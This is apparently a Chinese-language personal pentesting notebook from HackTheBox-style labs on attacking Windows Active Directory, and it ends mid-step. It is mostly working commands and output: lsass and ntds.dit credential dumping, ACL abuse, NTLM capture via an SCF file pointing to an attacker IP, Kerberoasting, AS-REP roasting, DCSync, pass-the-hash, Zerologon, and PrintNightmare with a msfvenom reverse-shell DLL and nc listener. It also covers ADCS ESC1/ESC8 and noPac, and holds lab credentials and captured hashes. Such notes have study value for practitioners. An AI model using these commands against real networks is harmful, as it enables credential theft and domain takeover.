	*EXTRA Dir        -1	C:\Users\jorden\Documents\My Pictures\
	*EXTRA Dir        -1	C:\Users\jorden\Documents\My Videos\
	    New File  		     488	desktop.ini
  0%
100%
	    New File  		      34	root.txt
  0%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         3
   Files :         2         2         0         0         0         0
   Bytes :       522       522         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :              261000 Bytes/sec.
   Speed :              14.934 MegaBytes/min.
   Ended : Thursday, September 21, 2023 12:14:58 AM

*Evil-WinRM* PS C:\Users\jorden\Documents> dir


    Directory: C:\Users\jorden\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/20/2023   9:18 PM             34 root.txt


*Evil-WinRM* PS C:\Users\jorden\Documents> type root.txt
07ec2722979ecfcb764532874ff9b4f8
*Evil-WinRM* PS C:\Users\jorden\Documents>
```











### 免杀

待学习：https://github.com/TideSec/BypassAntiVirus

太难了以后学





### 密码和hash

讲解了各种方式的文章：

https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/

#### isass内存转储

可以lsass.exe内存转储成lsass.dmp，再拿minidump读取即可。（也可以拿pypykatz替代）

```shell
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords full
```



```shell
pypykatz lsa minidump lsass.dmp
```

#### DiskShadow

需要根据情况修改：

```shell
set context persistent nowriters
add volume c: alias someAlias
create
expose %someAlias% z:
exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
delete shadows volume %someAlias%
reset
```

```shell
diskshadow.exe /s .\script.txt
```



还应复制 SYSTEM 注册表配置单元，因为它包含解密 NTDS 文件内容的密钥：

```shell
	reg.exe save hklm\system c:\exfil\system.bak
```



如果ntds.dit因为正在使用无法读取，需要用diskshadow，具体参考https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/和本文件的Backup Operator组提权部分。



之后抓hash：

```python
python3.10 secretsdump.py  -system ~/github/CTF/Web/渗透/hackthebox/Blackfield/system.bak -ntds ~/github/CTF/Web/渗透/hackthebox/Blackfield/ntds.dit LOCAL -outputfile out.txt
```



### ACL滥用

#### User-Force-Change-Password扩展权限

拥有该扩展权限，可在不知道目标用户密码的情况下强制修改目标的密码。

```shell
Import-Module .\powerview.ps1
#添加用户hack对域管理员administrator 重置密码的权限
Add-DomainObjectAcl -TargetIdentity administrator -PrincipalIdentity hack -Rights ResetPassword -Verbose

#修改密码
admod -users -rb cn=administrator unicodepwd::feng123! -optenc
#该权限不支持拿net命令修改密码

#或者
$cred = ConvertTo-SecureString "feng123!" -AsPlainText -force
Set-DomainUserPassword -identity hack -accountpassword $cred
```



#### member权限属性

拥有该属性的权限，可以将任意用户、组或机器加入到目标安全组中。

比如拥有了Domain Admins组的member属性的完全控制权，就可以往Domain Admins组里添加用户

```shell
net group "domain admins" hack /add /domain
```





#### msDS-AllowedToActOnBehalfOfOtherIdentity

拥有该属性的权限，可以修改目标对象基于资源的约束性委派RBCD，进行攻击获取目标的权限

```shell
Import-Module .\powerview.ps1
#添加用户hack对域控的msDS-AllowedToActOnBehalfOfOtherIdentity属性修改权限
Add-DomainObjectAcl -TargetIdentity "CN=DC,OU=Domain Controllers,DC=xie,DC=com" -PrincipalIdentity hack -RightsGUID 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79 -Verbose

#创建机器账户machine$，密码为root，然后赋予机器账户machine$到域控的基于资源的约束性委派
add_rbcd.exe domain=xie.com dc=DC.xie.com tm=DC ma=machine mp=root
```

然后进行一次基于资源的约束性委派攻击：

![image-20230921110028201](README.assets/image-20230921110028201.png)



#### DCSync

```shell
python3.10 secretsdump.py  'egotistical-bank/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175' -just-dc
```



#### GenericAll权限

##### 1.应用于用户



修改目标密码

```powershell
net user administrator feng123! /domain
```

##### 2.应用于机器

进行基于资源的约束性委派攻击

```powershell
#创建机器账户machine$，密码为root，然后赋予机器账户machine$到域控的基于资源的约束性委派
add_rbcd.exe domain=xie.com dc=DC.xie.com tm=DC ma=machine mp=root
```

![image-20230921111021174](README.assets/image-20230921111021174.png)

##### 3.应用于组

给组添加用户

```shell
net group "domain admins" hack /add /domain
```

##### 4.应用于域

hack拥有对域对象xie.com的GenericAll权限。

给hack Sync权限：

![image-20230921111426803](README.assets/image-20230921111426803.png)

#### GenericWrite权限

类似于GenericAll权限，但是不能赋予User-Force-Change-Password和DCSync权限。

对于用户，可以修改其doesnotrequirepreauth属性的值来不需要 Kerberos 预身份验证，然后进行AS-REP Roasting攻击。

```shell
#evil-winrm必须先加载Bypass-4MSI才能powerview
menu
Bypass-4MSI
Import-Module .\powerview.ps1
Get-ADUser jorden | Set-ADAccountControl -doesnotrequirepreauth $true

```





#### WriteDACL权限

可以修改目标对象的DACL。拥有这个权限可以往指定安全对象写入任何的ACE，从而完全控制安全对象。

例如hack拥有对xie.com的WriteDACL权限，通过powerview脚本给hack添加对域xie.com的DCSync权限。

##### 

#### WriteOwner权限

可以修改目标对象的Owner属性。该权限可以修改指定安全对象的Owner属性为任意用户，而Owner默认拥有WriteDACL等权限，因此直接利用。

```shell
powershell
Import-Module .\PowerView.ps1
Set-DomainObjectOwner -identity claire -OwnerIdentity tom

Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword -Verbose

$cred = ConvertTo-SecureString "fengfeng123!@#" -AsPlainText -force
Set-DomainUserPassword -identity claire -accountpassword $cred
```





### 组策略

https://blog.csdn.net/Fly_hps/article/details/80641585

#### 组策略首选项提权

待更新



### NTLM协议

知道密码如何得到NTLMhash：

```shell
python2
import hashlib
hashlib.new('md4', 'REGGIE1234ronnie'.encode('utf-16le')).digest().encode('hex')
```





#### NTLM Relay

NTLM Relay 攻击其实应称为 Net-NTLM Relay 攻击，它发生在NTIM认证的第三步，在 Response 消息中存在Net-NTIM Hash， 当攻击者荻得了 Net-NTLM Hash 后，可以重放Net-NTLM Hash 进行中间人攻击。

谢公子_域渗透攻防指南4.7节讲解了很多的利用方式。

首先启动REsponder.py：

```shell
sudo python2 Responder.py -i 10.10.14.14 -wrfv


```



##### 1.LLMNR和NBNS协议

TOFO



##### 2.打印机漏洞



##### 3.PetitPotam



##### 4.图标

打开文件夹的时候

desktop.ini 文件：

```
```





写evil.scf：

```shell
[Shell]
Command=2
IconFile=\\10.10.14.14\\pwn.ico
[Taskbar]
Command=ToggleDesktop
```

收到：

```shell
[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.10.10.103
[SMB] NTLMv2-SSP Username : HTB\amanda
[SMB] NTLMv2-SSP Hash     : amanda::HTB:db80593a428122ee:F106CF0D023B250EC85C765E46F28047:0101000000000000C0653150DE09D20173E22EE2C0C1F3EF000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000100000000200000992C45A038172D6C22863A24A02D842CA7416B21814D9B7AF739DE479961DD0E0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003400000000000000000000000000
```









##### 5.浏览器



##### 6.Outlook



##### 7.系统命令



##### 8.Office



##### 9.PDF



##### 10.WPAD



##### 11.mssql

```shell
EXEC xp_dirtree '\\10.10.14.14\share', 1, 1
```







注意到hash.txt里面的内容是整行：

```shell
sql_svc::sequel:fc43c3cf9d892a59:DA1E50B737E201DD8658A6D76B21E981:0101000000000000C0653150DE09D201636DA589D7248772000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000473F89B23E1854B213BAAA60B3BD1FD6035630C5E4D855EB86994AE26263982F0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310034000000000000000000
```



之后两种利用方式，一种是hashcat破解：

```shell
#注意-m是5600
hashcat -m 5600 hash.txt /Users/feng/many-ctf/rockyou.txt --force
```

另外一种是重放Net-NTLM Hash，中继到SMB协议、HTTP协议、LDAP协议等。





### Kerberos协议

kerberos使用TCP/UDP 88端口进行认证，使用TCP/UDP 464端口进行密码重设。



#### 域内用户名枚举

Kerberos协议的AS-REQ阶段，请求包中cname是用户名，当用户状态是用户存在且启用、用户存在且禁用、用户不存在的时候，AS-REP包各不相同。

使用工具：kerbrute或者msf的`auxiliary/gather/kerberos_enumusers`模块。

```shell
./kerbrute_darwin_amd64 userenum --dc 10.10.10.175 /Users/feng/many-ctf/SecLists/Usernames/xato-net-10-million-usernames.txt -d egotistical-bank.local
```



可以拿username-anarchy工具来制作字典：

```shell
feng at fengs-MacBook-Pro.local in [~/ctftools/username-anarchy]  on git:master ✗  d5e653f "updated README"
12:10:27 › ./username-anarchy --input-file fullnames.txt --select-format first,flast,first.last,firstl > unames.txt
```





#### 域内密码喷洒

密码喷洒是用固定的密码去爆破用户名。一般和域内用户名枚举一起使用。

```shell
./kerbrute_darwin_amd64 passwordspray --dc 10.10.10.169 -d megabank.local user.txt 'Welcome123!'
```

但是kerbrute是针对kerberos协议的，遇到其他协议需要用crackmapexec。



#### AS-REP Roasting

AS-REP Roasting 是一种对用户账户进行离线爆破的攻击方式。但是该攻击方式使用上比较受限，因为其**需要用户账户设置“不要求 Kerberos 预身份验证”选项，而该选项默认是没有勾选的**。Kerberos 项身份验证发生在 Kerberos 身份验证的第一阶段 (AS_ REQ &AS_REP)，它的主要作用是防止密码离线爆破。默认情況下，预身份验证是开启的，KDC会记录密码错误次数，防止在线爆破。
当关用了预身份验证后，攻击者可以使用指定用户向域控制器的 Kerberos 88 端口请求票据，**此时城控不会进行任何验证就將TGT 和该用户 Fash 加密的 Iogin Session Key返回**。
因此，攻击者就可以对获取到的用户 Hash 加密的 Loein Sesion Kcey进行离线破得，如果宇典够强大，则可能破解得到该指定用户的明文密码。

```shell
GetNPUsers.py -dc-ip 10.10.10.161 htb.local/svc-alfresco -request
```

```shell
python3.10 GetNPUsers.py -dc-ip 10.10.10.175 egotistical-bank.local/ -usersfile ~/ctftools/username-anarchy/unames.txt
```

然后拿hashcat爆破：

```shell
hashcat -m 18200 hash.txt /Users/feng/many-ctf/rockyou.txt --force
```

需要注意的是AS-REP Roasting的时候hashcat的-m是18200，其他的时候不是。



#### Kerberoasting

这个ticket用于AP_REQ的认证。其中里面的enc_part是加密的，用户不可读取里面的内容。在AS_REQ请求里面是，是使用krbtgt的hash进行加密的，而在TGS_REQ里面是使用要请求的服务的hash加密的。因此如果我们拥有服务的hash就可以自己制作一个ticket，既白银票据。.正因为是使用要请求的服务的hash加密的，所以我们可以通过爆破enc_part获得该服务的hash。



```shell
python3.10 GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
```



```shell
.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972 /outfile:hash.txt
```



得到hash后拿hashcat爆破：

```shell
hashcat -m 13100 hash.txt /Users/feng/many-ctf/rockyou.txt --force
```



#### 非约束性委派攻击



#### 约束性委派攻击

从网络攻击的角度来看，如果攻击者控制了服务1的账户，并且服务1配置丁到域控的CIFS 的约束性委派，则可以利用服务1以任意用户权限(包括域管理员）访问域控的CIFS， 即相当于控制了域控。

#### 基于资源的约束性委派攻击

1. 拥有服务 A 的权限，这里只需要拥有一个普通的域账户权限即可，因为普通的域账户默认可以创建最多10个机器账户，机器账户可以作为服务账户使用。
2. 拥有在服务 B上配置允许服务A 的基于资源的约束性委派的权限，即拥有修改服务B的msDS-AllowedToActOuBsehalfOfotherldentity 属性的权限。机器账户自身和创建机器账户的用户即拥有该权限。

#### Kerberos Bronze Bit漏洞

对于约束性委派和基于资源的约束性委派，最后不返回票据的原因各不相同。但是，只要 rorwardable 标志位为 1，则约束性委派和基于资源的约束性委派在 S402Proxy 这一步均能获得票据。因此，我们后续的攻击就能成功。



### Ldap协议

389端口



### DCSync

模拟域控向其他域控请求数据同步。

```shell
python3.10 secretsdump.py  'egotistical-bank/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175' -just-dc
```



拿到Administrator的NTLM hash后连接即可：

```shell
python3.10 smbexec.py egotistical.local/Administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
```

或者psexec.py：

```shell
python3.10 psexec.py htb.local/Administrator@10.10.10.103 -hashes aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267
```



### MS14-068

拥有一个普通域账号的情况下提权成域管理员，无需知道krbtgt的Hash，类似黄金票据。

```shell
python3.10 goldenPac.py -dc-ip 10.10.10.52 -target-ip 10.10.10.52  htb.local/james@mantis.htb.local
```





### CVE-2019-1040 NTLM MIC绕过漏洞

漏洞完整利用攻击链需结合 NTIM Relay。完整攻击链如下：

1. 使用域内任意有效账户，通过 SMB 连接到目标机器，使用 Print Spooler 漏洞或PetitPotam 漏洞强制触发目标机器向指定机器进行 NTLM认证；
2. 中继服务器收到目标机器的 NTLM 认证流量后，通过粉除相应字段绕过 NTLM的完整性校验并修改 NTLM 数据包的标志位使得其从 SMB 协议中线到 LDAP 不需要签名；
3. 使用中继的 LDAP 流量，通过 LDAP 远程连接域控，执行高权限操作，赋子指定的账户高权限；
4. 使用提升了权限的账户进行 “后利用”，接管全域。



漏洞影响版本：

1. Windows 7 SP1 至 Windows 10 1903;
2. Windows Server 2008 至 Windows Server 2019.





### Pass The Hash

PTH（哈希传递攻击）

PTE （PaSS Tbe Hash， 哈希传遊政击）是内网横向移动的一种方式。由于 NTLM 认证过程和kerberos认证过程默认都是使用用户密码的 NITLMA Hasb 来进行加密，因此当获取到了用户密码的入NTLM Hash 而没有解出明文时，可以利用该NTLM Hash进行 PTH，对内网其他机器进行 Hash的碰撞，碰撞到使用相同密码的的机器，然后通过135或 413 端口横向移动到使用该密码的其他机器上。



### CVE-2020-1472 NetLogon权限提升漏洞

通过该漏洞，未经身份验证的攻击者只需要能访问城控的135端口即可通过 Netlogon 远程协议连接域控并重置域控机器账户的 Hash，从而导致攻击者可以利用域控的机器账户导出域内所有用户的Hash(域控的机器账户默认具有 DCSync 权限)，进而接管整个域。该漏洞存在的原因是 Netlogon 协议认证的加密模块存在缺陷，导致攻击者可以在没有凭据的情况下通过认证。通过认证后，调用 Netlogon 协议中 RPC 函数
NetrServerPasswordSet2 来重置城控机器账户的 Hash，从而接管全域。

影响版本：

```
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
Windows Server 2012
Windows Server 2012 (Server Core installation)
Windows Server 2012 R2
Windows Server 2012 R2 (Server Core installation)
Windows Server 2016
Windows Server 2016 (Server Core installation)
Windows Server 2019
Windows Server 2019 (Server Core installation)
Windows Server, version 1903 (Server Core installation)
Windows Server, version 1909 (Server Core installation)
Windows Server, version 2004 (Server Core installation)
```

先判断是否存在漏洞（第一个参数是域控的主机名）：

```python
python3.10 zerologon_tester.py MULTIMASTER 10.10.10.179
```

有漏洞就可以攻击：

```shell
python3.10 cve-2020-1472-exploit.py MULTIMASTER 10.10.10.179
Performing authentication attempts...
======================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!
```

然后dump hash：

```shell
python3.10 secretsdump.py   -just-dc -no-pass MULTIMASTER\$@10.10.10.179
Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:69cbf4a9b7415c9e1caf93d51d971be0:::
```





Mimikatz：







### Windows Print Spooler权限提升漏洞

Print Spooler是打印后台处理服务，即管理所有本地和⽹络打印队列及控制所有打印⼯作。该服务对应的进程以System权限执行，其设计存在一个鉴权代码缺陷，导致普通用户可以通过RPC触发RpcAddPrinterDriver绕过安全检查写入恶意驱动程序。如果域控存在此漏洞，域中普通用户即可通过远程连接域控的Print Spooler服务，向域控添加恶意驱动，从来控制整个域环境。



**影响版本：**

```
Windows Server 2012 R2 (Server Core installation)
Windows Server 2012 R2
Windows Server 2012 (Server Core installation)
Windows Server 2012
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core
installation)
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core
installation)
Windows Server 2008 for x64-based Systems Service Pack 2
Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core
installation)
Windows Server 2008 for 32-bit Systems Service Pack 2
Windows RT 8.1
Windows 8.1 for x64-based systems
Windows 8.1 for 32-bit systems
Windows 7 for x64-based Systems Service Pack 1
Windows 7 for 32-bit Systems Service Pack 1
Windows Server 2016 (Server Core installation)
Windows Server 2016
Windows 10 Version 1607 for x64-based Systems
Windows 10 Version 1607 for 32-bit Systems
Windows 10 for x64-based Systems
Windows 10 for 32-bit Systems
Windows 10 Version 21H2 for x64-based Systems
Windows 10 Version 21H2 for ARM64-based Systems
Windows 10 Version 21H2 for 32-bit Systems
Windows 11 for ARM64-based Systems
Windows 11 for x64-based Systems
Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows Server 2022 Azure Edition Core Hotpatch
Windows Server 2022 (Server Core installation)
Windows Server 2022
Windows 10 Version 21H1 for 32-bit Systems
Windows 10 Version 21H1 for ARM64-based Systems
Windows 10 Version 21H1 for x64-based Systems
Windows 10 Version 1909 for ARM64-based Systems
Windows 10 Version 1909 for x64-based Systems
Windows 10 Version 1909 for 32-bit Systems
Windows Server 2019 (Server Core installation)
Windows Server 2019
Windows 10 Version 1809 for ARM64-based Systems
Windows 10 Version 1809 for x64-based Systems
Windows 10 Version 1809 for 32-bit Systems
```



参考https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html

利用成功的三个先决条件：

1. 在目标系统上启用打印后台处理程序服务
2. 与目标系统的网络连接（已获得初始访问权限）
3. 低权限用户（或计算机）帐户的哈希值或密码

攻击方式1(使用https://github.com/cube0x0/CVE-2021-1675)：

首先检查目标是否开启MS-RPRN：

```shell
python3.10 rpcdump.py @10.10.10.237|grep "MS-RPRN"
Protocol: [MS-RPRN]: Print System Remote Protocol
```

如果开启了说明可能存在漏洞，拿msf生成一个反弹shell的dll：

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.14 LPORT=39502 -f dll > msf-reverse-shell-39502.dll
```

启动一个smb服务：

```shell
cp ~/many-ctf/Ma\!/msf-reverse-shell-39502.dll ./share
python3.10 smbserver.py share ./share

#进行攻击
python3.10 CVE-2021-1675.py atom/jason:'kidvscat_electron_@123'@10.10.10.237 '\\10.10.14.14\share\msf-reverse-shell-39502.dll'

[*] Connecting to ncacn_np:10.10.10.237[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\WINDOWS\System32\DriverStore\FileRepository\ntprint.inf_amd64_c62e9f8067f98247\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\10.10.14.14\share\msf-reverse-shell-39502.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Try 3...
Traceback (most recent call last):
```

虽然攻击脚本那边会报错，但是nc这边成功拿到shell：

```shell
nc -lv 39502
Microsoft Windows [Version 10.0.19042.906]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system
```



攻击方式2（使用https://github.com/calebstewart/CVE-2021-1675）：

```shell
upload CVE-2021-1675.ps1
Import-Module .\CVE-2021-1675.ps1

#在Administrators组中创建一个feng用户。
Invoke-Nightmare -NewUser "feng" -NewPassword "fengfeng123!!!"
```





### ADCS攻击



https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation

https://www.freebuf.com/articles/network/368120.html



（太多了）

(这部分是随便记的)





ADCS即Active Directory Certificate Service（活动目录证书服务，）

可以使用证书来进行Kerberos预身份认证：

```shell
#使用administrator.pfx证书进行身份认证，这一步就可以得到administrator的HTLM Hash
.\Rubeus.exe asktgt /user:Administrator /certificate：administrator.pfx /domain:hack.com /dc:DC.hack.com
#转储账号的凭证信息，输出的最后一行是HTLM Hash
Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials /show /nowrap
```



证书的注册流程：

1. 客户端生成一对公、私钥
2. 客户端生成证书签名请求(CSR，Certificate Signing
   Request)，里面包含客户端生成的公钥以及请求的证书模板、请求的主体等信息。整个CSR用客户端的私钥签名，发送给CA
3. CA收到请求后，从中取出公钥对CSR进行签名校验。校验通过后判断客户证书注册端请求的证书模板是否存在，如果存在，根据证书模板中的属性判断请求的主体是否有权限申请该证书。如果有权限，则还要根据其他属性，如发布要求、使用者名称、扩展等属性来生成证书。
4. CA使用其私钥签名生成的证书并发送给客户端
5. 客户端存储该证书在系统中





CVE-2022-26923：

该漏洞产生的主要原因是ADCS服务器在处理计算机模板证书时是通过机器的dNSHostName属性来辨别用户的，而普通域用户即有权限修改它所创建的机器账户dNSHostName属性，因此恶意攻击者可以创建一个机器账户，然后修改它的dNSHostName属性为域控的dNSHostName，然后去请求计算机模板的证书。ADCS服务器在生成证书时会将域控的dNSHostName属性写入证书中。当使用进行PKINI Kerberos认证时，KDC会查询活动目录中的sAMAccountName属性为“dNSHostName-域名+$"的对象，此时会查询到域控，因此会以域控机器账户的权限生成PAC放入票据中。由于域控机器账户默认具有DCSync权限，因此攻击者可以通过该票据导出域内任意用户的Hash。



https://systemweakness.com/exploiting-cve-2022-26923-by-abusing-active-directory-certificate-services-adcs-a511023e5366

（下面的脚本没有实地打过）

```shell
impacket-addcomputer 'lunar.eruca.com/thm:Password1@' -method LDAPS -computer-name 'THMPC' -computer-pass 'Password1@'

Set-ADComputer THMPC -ServicePrincipalName @{}
Set-ADComputer THMPC -DnsHostName LUNDC.lunar.eruca.com

certipy req 'lunar.eruca.com/THMPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine
```



这个也没有实地打过：

```shell
Import-Module .\Powermad.ps1
Import-Module .\PowerView.ps1

$Password = ConvertTo-SecureString 'fengfeng123!!!' -AsPlainText -Force
New-MachineAccount -MachineAccount "FENG" -Password $($Password) -Domain "sequel.htb" -DomainController "dc.sequel.htb" -Verbose

Set-DomainObject -Identity "FENG$" -Set @{"dnsHostname" = "dc.sequel.htb"} -Verbose
```





收集ADCS信息：

```shell
certutil.exe
```

证书模版配置错误漏洞攻击：

**ESC1**

1. 低权限用户可以注册证书（`Enrollment Rights: NT Authority\Authenticated Users`）
2. 无需授权签名。（`Authorized Signatures Required       : 0`）
3. 申请新证书的用户可以为其他用户申请证书，即任何用户，包括域管理员用户（`msPKI-Certificates-Name-Flag:ENROLLEE_SUPPLIES_SUBJECT`）



**攻击流程：**

```shell
 .\certify.exe find /vulnerable
 [!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519



Certify completed in 00:00:09.8715059
```

请求证书：

```shell
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
```

```shell

-----BEGIN RSA PRIVATE KEY-----
...
-----END CERTIFICATE-----


```



将上面的内容全部复制存储下来，然后：

```shell
iwr -uri http://10.10.14.14:39554/cert.pfx -outfile cert.pfx
upload Rubeus.exe


.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials /show /nowrap
```

即可得到administrator的NTLM hash





**ESC2：**

和ESC1的区别：证书模板定义了任意用途 EKU 或没有 EKU。

利用方式同ESC1.



**ESC8：**

ADCS在默认安装的时候，其Web接口支持NTLM身份验证并且没有启用任何NTLM Relay保护措施。强制域控制器计算机帐户(DC$)向配置了NTLM中继的主机进行身份验证。身份验证被转发给证书颁发机构(CA)并提出对证书的请求。获取到了DC$的证书后就可以为用户/机器请求TGS/TGT票据，获取相应的权限。

即想办法从其他地方进行NTLM Relay，把hash中继到web的ca服务器来获取证书。

```shell
python3 ntlmrelayx.py -t http://192.168.41.10/certsrv/certfnsh.asp -smb2support --adcs --template 'domain controller'

#使用PetitPotam漏洞触发
python3 PetitPotam.py -d hack.com -u hack -p Admin123 192.168.41.19 192.168.41.40
#使用Print Spooler漏洞触发
python3 printerbug.py hack/hack:Admin123@192.168.41.40 192.168.41.19 

Rubeus.exe asktgt /user:DC2$ /ptt /nowrap /outfile:ticket.kirbi /certificate:打印出的的base64格式的证书
#即可获取hash。
```



ESC2-ESC7不看了，不太常见而且细节上差不太多。

### CVE-2021-42287

该漏洞被命名为saMAccountName spoofing 漏洞。该漏洞允许攻击者在仅有⼀个普通域账号的场景下，利⽤该漏洞接管全域，危害极⼤。

**注意**：受漏洞影响的版本是未打补丁的全版本Windows域控



处理Username字段时的错误，如果第一次查找不到Username，KDC会继续查找 `Username$`。如果第二次还是查找不到，KDC会继续查找altSecurityIdentities属性为对应值的用户。

让KDC找不到用户：

- 跨域请求：跨域请求时，⽬标域活动⽬录数据库是找不到其他域的⽤户的，因此会⾛进这个 处理UserName的逻辑。
- **修改saMAccountName属性**：在当前域，可以通过修改saMAccountName属性让KDC找不
  到⽤户，然后⾛进这个处理UserName的逻辑。



票据中代表⽤户身份权限是数据块是PAC。而TGT中的PAC是根据预认证身份信息生成的，无法伪造，因此得想办法在ST中进行伪造。正常的ST中的PAC是直接复制TGT中的，得想办法让KDC在TGS-REP阶段重新生成PAC，而不是复制TGT中的PAC。这里有如下两种方式：

- **S4U2Self请求**：KDC在处理S4U2Self类型的TGS-REQ请求时，PAC是重新⽣成的。
- 跨域⽆PAC的TGT票据进⾏TGS请求：KDC在处理跨域的TGS-REQ请求时，如果携带的TGT
  认购权证中没有PAC，PAC会重新⽣成。



这个漏洞的产生核心的原因是KDC在处理UserName字段时的问题，而后结合两种攻击链针对域内和跨域进行攻击。

- 当针对域内攻击时，结合了CVE-2021-42278漏洞来修改机器⽤户的saMAccountName属
  性，让KDC找不到⽤户，⾛进处理UserName的逻辑。 然后再利⽤KDC在处理S4U2Self时的
  逻辑问题(不校验发起S4U2Self请求的⽤户是否具有权限发起S4U2Self请求)以及重新⽣成PAC的这⼀特性来进⾏攻击。
- 当针对跨域攻击时，其实意义不⼤。因为需要修改其他域内⾼权限⽤户的altSecurityIdentities属性，⽽默认是没有权限修改的，只有根域管理员或者其他域的域管理员才有权限修改。当跨域TGS请求时，⽬标域控在活动⽬录数据库内是找不到其他域的⽤户的，因此⾛进处理UserName的逻辑。然后再利⽤跨域TGS-REQ请求时的处理逻辑(如果TGT票据中没有PAC，则重新⽣成)这⼀特性来进⾏攻击的。



![图片.png](README.assets/1685550372_64777524735661b3a5d75.jpeg)



1.创建机器账户`machine$`，密码是root：

```shell
python3.10 addcomputer.py -computer-name 'machine' -computer-pass 'root' -dc-ip 192.168.41.10 'hack.com/hack:Admin123' -method SAMR -debug
```

或者使用powershell脚本创建：

```shell
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount machine -Password root
```

通过powershell创建的机器账户有SPN，需要删除SPN：

```shell
Import-Module .\powerview.ps1
Set-DomainObject "CN=machine,CN=Computers,DC=hack,DC=com" -Clear 'serviceprincipalname' -Verbose
```





2.修改机器账户的saMAccountName属性为域控

```shell
Import-Module .\Powermad.ps1
#查询机器账户的machine2$的saMAccountName 属性
Get-MachineAccountAttribute -MachineAccount machine2 -Attribute saMAccountName
#修改器账户的machine2$的saMAccountName 属性为DC
 Set-MachineAccountAttribute -MachineAccount machine2 -Value "DC" -Attribute saMAccountName -Verbose

```

3.请求TGT

```shell
